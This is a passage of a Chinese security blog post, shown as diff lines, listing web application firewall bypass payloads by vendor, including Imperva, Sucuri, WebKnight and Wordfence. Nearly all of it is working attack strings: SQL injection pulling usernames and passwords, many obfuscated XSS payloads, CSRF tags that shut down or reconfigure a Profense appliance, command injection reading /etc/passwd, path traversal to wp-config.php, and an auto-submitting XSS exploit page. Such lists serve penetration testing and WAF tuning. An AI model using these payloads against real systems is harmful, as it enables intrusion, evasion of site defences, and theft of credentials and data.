+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%0bAND(SELECT%0b1%20FROM%20mysql.x)</span><br></pre></td></tr></table></figure>
+
+<p>SQLi Bypass by @SQLMap Devs (v2.2)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%40%40new%20union%23sqlmapsqlmap...%0Aselect%201,2,database%23sqlmap%0A%28%29</span><br></pre></td></tr></table></figure>
+
+<p>SQLi Bypass by @HackPlayers (v2.2)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0Aselect%200x00%2C%200x41%20not%20like%2F*%2100000table_name*%2F%2C3%20from%20information_schema.tables%20limit%201</span><br></pre></td></tr></table></figure>
+
+<h3 id="Imperva"><a href="#Imperva" class="headerlink" title="Imperva"></a><strong>Imperva</strong></h3><p>Imperva SecureSphere 13 - Remote Command Execution by @rsp3ar</p>
+<p>XSS Bypass by @David Y</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload\r\n&#x3D;$.globalEval(&quot;al&quot;+&quot;ert()&quot;);&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @Emad Shanab</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;self[&#96;aler&#96;%2b&#96;t&#96;]&#96;1&#96;&gt;</span><br><span class="line">anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @WAFNinja</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @i_bo0om</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe&#x2F;onload&#x3D;&#39;this[&quot;src&quot;]&#x3D;&quot;javas&amp;Tab;cript:al&quot;+&quot;ert&#96;&#96;&quot;&#39;;&gt;</span><br><span class="line">&lt;img&#x2F;src&#x3D;q onerror&#x3D;&#39;new Function&#96;al\ert\&#96;1\&#96;&#96;&#39;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @c0d3g33k</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data&#x3D;&#39;data:text&#x2F;html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg&#x3D;&#x3D;&#39;&gt;&lt;&#x2F;object&gt;</span><br></pre></td></tr></table></figure>
+
+<p>SQLi Bypass by @DRK1WI</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">15 and &#39;1&#39;&#x3D;(SELECT &#39;1&#39; FROM dual) and &#39;0having&#39;&#x3D;&#39;0having&#39;</span><br></pre></td></tr></table></figure>
+
+<p>SQLi by @Giuseppe D’Amore</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stringindatasetchoosen%%&#39; and 1 &#x3D; any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like &#39;%%dministrator&#39; and rownum&lt;&#x3D;1 and PASSWORD like &#39;0%&#39;) and &#39;1%%&#39;&#x3D;&#39;1</span><br><span class="line">Imperva SecureSphere &lt;&#x3D; v13 - Privilege Escalation by @0x09AL</span><br></pre></td></tr></table></figure>
+
+<h3 id="Kona-SiteDefender"><a href="#Kona-SiteDefender" class="headerlink" title="Kona SiteDefender"></a><strong>Kona SiteDefender</strong></h3><p>HTML Injection by @sp1d3rs</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2522%253E%253Csvg%2520height%3D%2522100%2522%2520width%3D%2522100%2522%253E%2520%253Ccircle%2520cx%3D%252250%2522%2520cy%3D%252250%2522%2520r%3D%252240%2522%2520stroke%3D%2522black%2522%2520stroke-width%3D%25223%2522%2520fill%3D%2522red%2522%2520%2F%253E%2520%253C%2Fsvg%253E</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @Jonathan Bouman</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body%20alt&#x3D;al%20lang&#x3D;ert%20onmouseenter&#x3D;&quot;top[&#39;al&#39;+lang](&#x2F;PoC%20XSS%20Bypass%20by%20Jonathan%20Bouman&#x2F;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @zseano</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&quot;&gt;&lt;&#x2F;script&gt;&lt;base%20c%3D&#x3D;href%3Dhttps:\mysite&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @0xInfection</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;abc&#x2F;onmouseenter&#x3D;confirm%60%60&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @sp1d3rs</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2522%253E%253C%2Fdiv%253E%253C%2Fdiv%253E%253Cbrute%2520onbeforescriptexecute%3D%2527confirm%28document.domain%29%2527%253E</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @Frans Rosén</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;@keyframes a&#123;&#125;b&#123;animation:a;&#125;&lt;&#x2F;style&gt;&lt;b&#x2F;onanimationstart&#x3D;prompt&#96;$&#123;document.domain&#125;&amp;#x60;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @Ishaq Mohammed</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;marquee+loop&#x3D;1+width&#x3D;0+onfinish&#x3D;&#39;new+Function&#96;al\ert\&#96;1\&#96;&#96;&#39;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Profense"><a href="#Profense" class="headerlink" title="Profense"></a><strong>Profense</strong></h3><p>GET Type CSRF Attack by @Michael Brooks (&gt;= v.2.6.2)</p>
+<p>Turn off Proface Machine</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;https:&#x2F;&#x2F;host:2000&#x2F;ajax.html?action&#x3D;shutdown&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Add a proxy</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;https:&#x2F;&#x2F;10.1.1.199:2000&#x2F;ajax.html?vhost_proto&#x3D;http&amp;vhost&#x3D;vhost.com&amp;vhost_port&#x3D;80&amp;rhost_proto&#x3D;http&amp;rhost&#x3D;10.1.1.1&amp;rhost_port&#x3D;80&amp;mode_pass&#x3D;on&amp;xmle&#x3D;on&amp;enable_file_upload&#x3D;on&amp;static_passthrough&#x3D;on&amp;action&#x3D;add&amp;do&#x3D;save&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @Michael Brooks (&gt;= v.2.6.2)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;host:2000&#x2F;proxy.html?action&#x3D;manage&amp;main&#x3D;log&amp;show&#x3D;deny_log&amp;proxy&#x3D;&gt;&quot;&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @EnableSecurity (&gt;= v2.4)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%3CEvil%20script%20goes%20here%3E&#x3D;%0AByPass</span><br><span class="line">%3Cscript%3Ealert(document.cookie)%3C&#x2F;script%20ByPass%3E</span><br></pre></td></tr></table></figure>
+
+<h3 id="QuickDefense"><a href="#QuickDefense" class="headerlink" title="QuickDefense"></a><strong>QuickDefense</strong></h3><p>XSS Bypass by @WAFNinja</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?&lt;input type&#x3D;&quot;search&quot; onsearch&#x3D;&quot;aler\u0074(1)&quot;&gt;</span><br><span class="line">&lt;details ontoggle&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Sucuri"><a href="#Sucuri" class="headerlink" title="Sucuri"></a><strong>Sucuri</strong></h3><p>Smuggling RCE Payloads by @theMiddle</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;???&#x2F;??t+&#x2F;???&#x2F;??ss??</span><br></pre></td></tr></table></figure>
+
+<p>Obfuscating RCE Payloads by @theMiddle</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;+cat+&#x2F;e&#39;tc&#x2F;pass&#39;wd</span><br><span class="line">c\\a\\t+&#x2F;et\\c&#x2F;pas\\swd</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @Luka</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;input&#x2F;onauxclick&#x3D;&quot;[1].map(prompt)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @Brute Logic</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data:text&#x2F;html,&lt;form action&#x3D;https:&#x2F;&#x2F;brutelogic.com.br&#x2F;xss-cp.php method&#x3D;post&gt;</span><br><span class="line">&lt;input type&#x3D;hidden name&#x3D;a value&#x3D;&quot;&lt;img&#x2F;src&#x3D;&#x2F;&#x2F;knoxss.me&#x2F;yt.jpg onpointerenter&#x3D;alert&#96;1&#96;&gt;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit&gt;&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="URLScan"><a href="#URLScan" class="headerlink" title="URLScan"></a><strong>URLScan</strong></h3><p>Directory Traversal by @ZeQ3uL (&lt;= v3.1) (Only on ASP.NET)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;host.com&#x2F;test.asp?file&#x3D;.%.&#x2F;bla.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="WebARX"><a href="#WebARX" class="headerlink" title="WebARX"></a><strong>WebARX</strong></h3><p>Cross Site Scripting by @0xInfection</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a69&#x2F;onauxclick&#x3D;open&amp;#40&amp;#41&gt;rightclickhere</span><br></pre></td></tr></table></figure>
+
+<h3 id="WebKnight"><a href="#WebKnight" class="headerlink" title="WebKnight"></a><strong>WebKnight</strong></h3><p>Cross Site Scripting by @WAFNinja</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;isindex action&#x3D;j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1) type&#x3D;image&gt;</span><br><span class="line">&lt;marquee&#x2F;onstart&#x3D;confirm(2)&gt;</span><br><span class="line">&lt;details ontoggle&#x3D;alert(1)&gt;</span><br><span class="line">&lt;div contextmenu&#x3D;&quot;xss&quot;&gt;Right-Click Here&lt;menu id&#x3D;&quot;xss&quot; onshow&#x3D;&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;x onwheel&#x3D;prompt(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>SQLi by @WAFNinja</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0 union(select 1,username,password from(users))</span><br><span class="line">0 union(select 1,@@hostname,@@datadir)</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @Aatif Khan (v4.1)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;details ontoggle&#x3D;alert(1)&gt;</span><br><span class="line">&lt;div contextmenu&#x3D;&quot;xss&quot;&gt;Right-Click Here&lt;menu id&#x3D;&quot;xss&quot; onshow&#x3D;&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>SQLi Bypass by @ZeQ3uL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10 a%nd 1&#x3D;0&#x2F;(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Wordfence"><a href="#Wordfence" class="headerlink" title="Wordfence"></a><strong>Wordfence</strong></h3><p>XSS Bypass by @brute Logic</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;javas&amp;#99;ript:alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XSS Bypass by @0xInfection</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a&#x2F;**&#x2F;href&#x3D;j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At&amp;colon;&#x2F;**&#x2F;alert()&#x2F;**&#x2F;&gt;click</span><br></pre></td></tr></table></figure>
+
+<p>HTML Injection by @Voxel</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;host&#x2F;wp-admin&#x2F;admin-ajax.php?action&#x3D;revslider_show_image&amp;img&#x3D;..&#x2F;wp-config.php</span><br></pre></td></tr></table></figure>
+
+<p>XSS Exploit by @MustLive (&gt;= v3.3.5)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Wordfence Security XSS exploit (C) 2012 MustLive.</span><br><span class="line">http:&#x2F;&#x2F;websecurity.com.ua&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body onLoad&#x3D;&quot;document.hack.submit()&quot;&gt;</span><br><span class="line">&lt;form name&#x3D;&quot;hack&quot; action&#x3D;&quot;http:&#x2F;&#x2F;site&#x2F;?_wfsf&#x3D;unlockEmail&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;email&quot;</span><br><span class="line">value&#x3D;&quot;&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Other XSS Bypasses</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meter onmouseover&#x3D;&quot;alert(1)&quot;</span><br><span class="line">&#39;&quot;&gt;&gt;&lt;div&gt;&lt;meter onmouseover&#x3D;&quot;alert(1)&quot;&lt;&#x2F;div&gt;&quot;</span><br><span class="line">&gt;&gt;&lt;marquee loop&#x3D;1 width&#x3D;0 onfinish&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Apache-Generic"><a href="#Apache-Generic" class="headerlink" title="Apache Generic"></a><strong>Apache Generic</strong></h3><p>Writing method type in lowercase by @i_bo0om</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get &#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Host: favoritewaf.com</span><br><span class="line">User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE5.01; Windows NT)</span><br></pre></td></tr></table></figure>
+
+<h3 id="IIS-Generic"><a href="#IIS-Generic" class="headerlink" title="IIS Generic"></a><strong>IIS Generic</strong></h3><p>Tabs before method by @i_bo0om</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;login.php HTTP&#x2F;1.1</span><br><span class="line">Host: favoritewaf.com</span><br><span class="line">User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE5.01; Windows NT)</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/waf/" rel="tag"># waf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/05/03/%E6%94%BB%E9%98%B2%E6%B5%8B%E8%AF%95%E6%89%8B%E5%86%8C/" rel="next" title="攻防测试手册">
+                <i class="fa fa-chevron-left"></i> 攻防测试手册
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/05/03/wpscan/" rel="prev" title="wpscan">
+                wpscan <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+  
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/emperor.jpg"
+                alt="bosch cheng" />
+            
+              <p class="site-author-name" itemprop="name">bosch cheng</p>
+              <p class="site-description motion-element" itemprop="description">在这片海洋中，如若无法向上攀游，就只有往下沉沦</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">60</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">59</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/ckcah" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/whaites2" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.facebook.com/bing.cheng.5682" target="_blank" title="FB Page">
+                      
+                        <i class="fa fa-fw fa-facebook"></i>FB Page</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0X00-Fuzz-爆破"><span class="nav-number">1.</span> <span class="nav-text">0X00  Fuzz&#x2F;爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X01-正则绕过"><span class="nav-number">2.</span> <span class="nav-text">0X01  正则绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#黑名单检测-bypass"><span class="nav-number">2.1.</span> <span class="nav-text">黑名单检测&#x2F;bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#•-Step-1"><span class="nav-number">2.1.1.</span> <span class="nav-text">• Step 1:</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X02-混淆-编码"><span class="nav-number">3.</span> <span class="nav-text">0X02    混淆&#x2F;编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X04-HTTP-参数污染"><span class="nav-number">4.</span> <span class="nav-text">0X04    HTTP 参数污染</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#手法"><span class="nav-number">4.1.</span> <span class="nav-text">手法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0X05-浏览器的缺陷"><span class="nav-number">5.</span> <span class="nav-text">0X05    浏览器的缺陷</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Charset-Bugs"><span class="nav-number">5.1.</span> <span class="nav-text">Charset Bugs:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Null-空字节"><span class="nav-number">5.2.</span> <span class="nav-text">Null 空字节</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解析错误"><span class="nav-number">5.3.</span> <span class="nav-text">解析错误</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Unicode-分隔符"><span class="nav-number">5.4.</span> <span class="nav-text">Unicode 分隔符</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用其他非典型等效语法结构替换"><span class="nav-number">6.</span> <span class="nav-text">使用其他非典型等效语法结构替换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#滥用SSL-TLS密码"><span class="nav-number">7.</span> <span class="nav-text">滥用SSL&#x2F;TLS密码:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#滥用-DNS-记录"><span class="nav-number">8.</span> <span class="nav-text">滥用 DNS 记录:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#请求头欺骗"><span class="nav-number">9.</span> <span class="nav-text">请求头欺骗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Google-Dorks-Approach"><span class="nav-number">10.</span> <span class="nav-text">Google Dorks Approach:</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#搜索语法"><span class="nav-number">10.1.</span> <span class="nav-text">搜索语法:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Normal-search"><span class="nav-number">10.2.</span> <span class="nav-text">Normal search:</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X06-拓展Bypass姿势"><span class="nav-number"></span> <span class="nav-text">0X06  拓展Bypass姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Airlock-Ergon"><span class="nav-number">1.</span> <span class="nav-text">Airlock Ergon</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Barracuda"><span class="nav-number">2.</span> <span class="nav-text">Barracuda</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cerber-WordPress"><span class="nav-number">3.</span> <span class="nav-text">Cerber (WordPress)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Citrix-NetScaler"><span class="nav-number">4.</span> <span class="nav-text">Citrix NetScaler</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Comodo"><span class="nav-number">5.</span> <span class="nav-text">Comodo</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DotDefender"><span class="nav-number">6.</span> <span class="nav-text">DotDefender</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Fortinet-Fortiweb"><span class="nav-number">7.</span> <span class="nav-text">Fortinet Fortiweb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#F5-ASM"><span class="nav-number">8.</span> <span class="nav-text">F5 ASM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#F5-BIG-IP"><span class="nav-number">9.</span> <span class="nav-text">F5 BIG-IP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#F5-FirePass"><span class="nav-number">10.</span> <span class="nav-text">F5 FirePass</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ModSecurity"><span class="nav-number">11.</span> <span class="nav-text">ModSecurity</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Imperva"><span class="nav-number">12.</span> <span class="nav-text">Imperva</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kona-SiteDefender"><span class="nav-number">13.</span> <span class="nav-text">Kona SiteDefender</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Profense"><span class="nav-number">14.</span> <span class="nav-text">Profense</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#QuickDefense"><span class="nav-number">15.</span> <span class="nav-text">QuickDefense</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sucuri"><span class="nav-number">16.</span> <span class="nav-text">Sucuri</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#URLScan"><span class="nav-number">17.</span> <span class="nav-text">URLScan</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WebARX"><span class="nav-number">18.</span> <span class="nav-text">WebARX</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WebKnight"><span class="nav-number">19.</span> <span class="nav-text">WebKnight</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Wordfence"><span class="nav-number">20.</span> <span class="nav-text">Wordfence</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Apache-Generic"><span class="nav-number">21.</span> <span class="nav-text">Apache Generic</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IIS-Generic"><span class="nav-number">22.</span> <span class="nav-text">IIS Generic</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">bosch cheng</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v</div>
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
